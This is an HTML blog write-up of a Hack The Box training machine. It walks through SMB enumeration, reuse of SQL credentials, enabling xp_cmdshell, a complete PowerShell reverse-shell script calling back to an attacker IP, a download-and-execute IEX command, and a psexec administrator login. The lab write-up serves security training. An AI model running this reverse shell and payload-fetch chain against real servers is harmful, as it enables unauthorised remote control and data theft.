I"9(<ul>
  <li><strong>Target IP:</strong> 10.10.10.27</li>
  <li><strong>Tools used:</strong> nmap, smbclient, mssqclient.py, python3, ufw, nc, psexec.py</li>
</ul>

<p><em>This is gonna be a lil bit detailed since it’s the first machine in this series. I use ubuntu, so you might not need to use <code class="language-plaintext highlighter-rouge">sudo</code></em></p>

<h2 id="phase-1-enumeration"><strong>Phase 1:</strong> Enumeration</h2>

<p>We scan the IP for the open ports using <code class="language-plaintext highlighter-rouge">nmap</code></p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-oA</span> nmap/archetype 10.10.10.27
</code></pre></div></div>

<p><img src="/assets/images/archetype/nmap-scan-1-archetype.png" /></p>

<p>We found two crucial ports open:<br />
On <code class="language-plaintext highlighter-rouge">445</code> <strong>SMB</strong> is running <br />
On <code class="language-plaintext highlighter-rouge">1433</code> <strong>SQL</strong> is running</p>

<p>Lets check if anonymous login is available on <strong>SMB</strong></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.10.10.27/
</code></pre></div></div>
<p><img src="/assets/images/archetype/smb-1-archetype.png" /></p>

<p>Lets enumerate <code class="language-plaintext highlighter-rouge">backups</code> share/directory because it might contain config files which usually have usernames and passwords</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">-N</span> //10.10.10.27/backups
</code></pre></div></div>
<p><img src="/assets/images/archetype/smb-2-archetype.png" /></p>

<p>After listing directory contents using <code class="language-plaintext highlighter-rouge">dir</code><br />
<code class="language-plaintext highlighter-rouge">prod.dtsConfig</code> file is found. It’s a config file of <strong>SQL</strong>. <br />
Download the file using <code class="language-plaintext highlighter-rouge">get prod.dtsConfig</code><br />
Contents of the file:</p>

<p><img src="/assets/images/archetype/config-file-archetype.png" /></p>

<p>We got SQL <em>user creds:</em> <br />
<strong>User ID</strong> = ARCHETYPE\sql_svc <br />
<strong>Password</strong> = M3g4c0rp123</p>

<p>Now that we’ve SQL creds, we can establish a SQL connection using <code class="language-plaintext highlighter-rouge">mssqlclient.py</code> -  can be found in examples folder of <a href="https://github.com/SecureAuthCorp/impacket">impackets</a></p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 mssqlclient.py sql_svc@10.10.10.27 <span class="nt">-windows-auth</span>
</code></pre></div></div>
<p>It asks for the password, give the password we found in config file</p>

<p><img src="/assets/images/archetype/sql-connection-archetype.png" />
Lets check if we’ve administrative privileges on SQL database</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; SELECT IS_SRVROLEMEMBER<span class="o">(</span><span class="s1">'sysadmin'</span><span class="o">)</span>
</code></pre></div></div>
<p><img src="/assets/images/archetype/sql-srvrolemember-archetype.png" /></p>

<p>We got output as <code class="language-plaintext highlighter-rouge">1</code> - meaning: Yes, we’ve indeed.</p>

<p>Now, we can configure few database settings so that we can run <code class="language-plaintext highlighter-rouge">cmd</code> commands on the host system - system that’s hosting this database, in our case that’s our target <code class="language-plaintext highlighter-rouge">10.10.10.27</code></p>

<p>To execute cmd commands through SQL shell, there’s a command called <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>.<br /></p>
<ul>
  <li>To enable this we need administrative privileages that’s why we checked if we’d admin privileages or not.<br /></li>
  <li>Second thing is to enable <code class="language-plaintext highlighter-rouge">show advanced options</code></li>
</ul>

<p>Let’s check default values:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; sp_configure
</code></pre></div></div>
<p><img src="/assets/images/archetype/sql-sp-configure-archetype.png" />
<img src="/assets/images/archetype/sql-advanced-option-initial-archetype.png" /></p>

<ul>
  <li>To enable <code class="language-plaintext highlighter-rouge">show advanced options</code>:</li>
</ul>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; EXEC sp_configure <span class="s1">'show advanced options'</span>, 1
SQL&gt; reconfigure<span class="p">;</span>
</code></pre></div></div>

<ul>
  <li>To enable <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>:</li>
</ul>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; EXEC sp_configure <span class="s1">'xp_cmdshell'</span>, 1
SQL&gt; reconfigure<span class="p">;</span>
SQL&gt; sp_configure<span class="p">;</span>
</code></pre></div></div>
<p>After enabling both</p>

<p><img src="/assets/images/archetype/sql-sp-configure-set-archetype.png" /></p>

<p>Now we can run <code class="language-plaintext highlighter-rouge">cmd</code> commands using 
<code class="language-plaintext highlighter-rouge">xp_cmdshell</code></p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; xp_cmdshell <span class="s1">'whoami'</span>
</code></pre></div></div>
<p><img src="/assets/images/archetype/sql-whoami-archetype.png" />
Now lets get a reverse shell using powershell script</p>

<h2 id="phase-2-foothold"><strong>Phase 2:</strong> Foothold</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$client = New-Object System.Net.Sockets.TCPClient("10.10.14.41",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
</code></pre></div></div>

<ul>
  <li>Copy the above <code class="language-plaintext highlighter-rouge">powershell</code> script into a file with extension <code class="language-plaintext highlighter-rouge">.ps1</code></li>
  <li>Change the <code class="language-plaintext highlighter-rouge">IP</code> in the script to your own htb IP</li>
</ul>

<p>Start a python server in reverse shell script folder, so that we can download the script onto victim system and run it.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>
<p>Start a listener using <code class="language-plaintext highlighter-rouge">netcat</code>. When victim system tries to connect to us, we need to listen for it. Hence the name: <code class="language-plaintext highlighter-rouge">reverse shell</code></p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-lvnp</span> 443
</code></pre></div></div>
<p>I’m ubuntu, so firewall is not enabled by default but if you’re on <code class="language-plaintext highlighter-rouge">parrot then it is enabled by default.
We can use </code>ufw` to allow the call backs on port 80 and 443 to our machine.</p>

<p><img src="/assets/images/archetype/ufw-1-archetype.png" /></p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>ufw allow from 10.10.10.27 proto tcp to any port 80,443
</code></pre></div></div>

<p>Run the below command to download our shell script onto the target system and auto run it while we wait it make a connection to our netcat listener. <br />
Here also change the IP</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; xp_cmdshell <span class="s2">"powershell "</span>IEX <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="se">\"</span>http://10.10.14.41/shell.ps1<span class="se">\"</span><span class="o">)</span><span class="p">;</span>
</code></pre></div></div>

<p>Check the nc listner status <br />
And when connection established.. <br />
You can read the <em>user.txt</em> but that’s not needed in this challenge.<br />
Let’s check the powershell history to view what were the user’s recent actions and looks like we found</p>

<p><strong>Administrator password:</strong> MEGACORP_4dm1n!!</p>

<h2 id="phase-3-privilege-escalation"><strong>Phase 3:</strong> Privilege Escalation</h2>
<p><img src="/assets/images/archetype/nc-archetype.png" /></p>

<p>Now that we have admin password, we can try logging in using <code class="language-plaintext highlighter-rouge">psexec.py</code><br /></p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python3 psexec.py administrator@10.10.10.27 
</code></pre></div></div>
<p>It prompts for password, enter the password and you have the SHELL!!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ type c:\users\administrator\desktop\root.txt
</code></pre></div></div>

<h5 id="submit-the-flag-happy-hacking-">Submit the flag, happy hacking :)</h5>
:ET